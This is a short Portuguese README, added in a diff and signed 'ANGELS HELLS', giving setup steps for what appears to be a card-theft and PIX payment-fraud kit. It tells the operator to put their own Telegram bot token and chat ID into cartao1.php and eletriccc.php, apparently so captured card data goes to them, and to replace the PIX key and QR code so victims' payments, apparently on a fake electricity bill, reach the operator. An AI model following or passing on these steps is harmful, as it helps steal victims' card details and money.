@@ -1,0 +1,13 @@
+👹👹👹👹👹👹👹 👹[ 𝐀𝐍𝐆𝐄𝐋𝐒 𝐇𝐄𝐋𝐋𝐒 ] 👻 👻👻👻👻👻👻👻👻
+
+mude o qr code em imagem bote uma foto com o mesmo nome no lugar da que esta la 
+
+mude em cartao1.php e  eletriccc.php o chat id e o token do bot 
+
+crie um bot em @BotFather pegue o token la crie um bot tudo bonitinho 
+
+va em @GetMyChatID_Bot e pegue seu id la e troque tudo em pagamento 
+
+o pix vc troca em eletricpix2.php e no pix5.php
+
+OBS:os bot sao todos no telegram 
